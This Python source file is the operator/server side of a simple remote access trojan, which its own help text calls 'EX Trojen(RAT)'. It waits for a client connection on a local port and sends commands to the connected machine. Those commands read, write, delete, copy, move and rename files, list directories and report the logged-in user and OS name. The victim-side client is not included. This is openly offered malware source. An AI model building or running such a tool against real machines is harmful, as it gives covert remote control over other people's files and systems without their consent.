import socket


class Ex:
    def __init__(self):
        self.host = '127.0.0.1'
        self.port = 9090

        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))

        self.server.listen()

        self.client, self.address = self.server.accept()

        self.tj_loop()

    def tj_loop(self):
        while True:
            try:
                print(f"Connected to {self.address}")
                # Bug 1 : Before Entering a command if we press ENTER key then It ENTER Key doesn't works even after
                # we Pressing ENter after writing command
                cmd_input = input("Enter a Command : ")
                self.client.send(cmd_input.encode('utf-8'))
                command = self.client.recv(1024).decode('utf-8')
                h = '''Command of EX Trojen(RAT): 

                1) hello : It print Hello World in Client Side.
                2) help : For help.
                3) cwd : It checks the current working Directory.
                4) osname : It checks the name of os.
                5) ls : List Directories.
                6) getlogin : Show which user is logged in.
                7) getpid : Current working Directory.
                8) chdir : It is for changing directory.
                9) mkdir : It is for making directory.
                10) rmdir : It is for removing directory.
                11) rename : It is for renaming directory.
                12) read : For reading file content.
                13) touch : It is use to Create a file.
                14) copy : It copy the file to another file
                15) move : It moves the file to the location you give
                16) write : It is for file Write.
                17) delfile : It is for deleting File.'''

                if command == 'help':
                    print(h)
                elif 'chdir' in command:
                    self.client.send(input("Enter the path : ").encode('utf-8'))
                    print(self.client.recv(1024).decode('utf-8'))
                elif 'mkdir' in command:
                    self.client.send(input("Enter Filename : ").encode('utf-8'))
                    print(self.client.recv(1024).decode('utf-8'))
                elif 'rename' in command:
                    self.client.send(input("Enter existing Filename (Not Case Sensitive) : ").encode('utf-8'))
                    self.client.send(input("Enter New Filename : ").encode('utf-8'))
                    print(self.client.recv(1024).decode('utf-8'))
                elif 'rmdir' in command:
                    self.client.send(input("Enter Filename you want to remove (Not Case Sensitive): ").encode('utf-8'))
                    print(self.client.recv(1024).decode('utf-8'))
                elif 'touch' in command:
                    self.client.send(input("Enter the filename you want to create : ").encode('utf-8'))
                    print(self.client.recv(1024).decode('utf-8'))
                elif 'read' in command:
                    self.client.send(input("Enter Filename you want to read : ").encode('utf-8'))
                    print(self.client.recv(10240).decode('utf-8'))
                elif 'write' in command:
                    self.client.send(input("Enter the filename you want to Write in : ").encode('utf-8'))
                    self.client.send(input(self.client.recv(1024).decode('utf-8')).encode('utf-8'))
                    print(self.client.recv(10240).decode('utf-8'))
                elif 'delfile' in command:
                    self.client.send(input("Enter the filename you want to delete : ").encode('utf-8'))
                    print(self.client.recv(1024).decode('utf-8'))
                elif 'copy' in command:
                    self.client.send(input("Enter the filename you want to copy : ").encode('utf-8'))
                    self.client.send(input("Enter the filename to which you want to copy the content : ").encode('utf-8'))
                    print(self.client.recv(1024).decode('utf-8'))
                elif 'move' in command:
                    self.client.send(input("Enter the file name you want to move align with path : ").encode('utf-8'))
                    self.client.send(input("Enter the path where you want to move the file : ").encode('utf-8'))
                    print(self.client.recv(1024).decode('utf-8'))
                else:
                    print(command)
            except:
                print("Something went Wrong!!")


Ex()
